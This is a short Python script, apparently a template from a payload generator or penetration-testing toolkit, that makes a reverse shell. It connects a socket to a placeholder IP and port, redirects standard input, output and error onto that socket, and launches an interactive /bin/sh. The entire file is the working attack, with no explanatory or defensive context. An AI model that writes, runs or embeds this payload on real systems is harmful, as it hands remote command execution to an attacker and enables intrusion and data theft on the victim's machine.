import subprocess
import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{{IP}}", {{PORT}}))

os.dup2(s.fileno(), 0) # stdIn
os.dup2(s.fileno(), 1) # stdOut
os.dup2(s.fileno(), 2) # stdErr

subprocess.call(["/bin/sh", "-i"])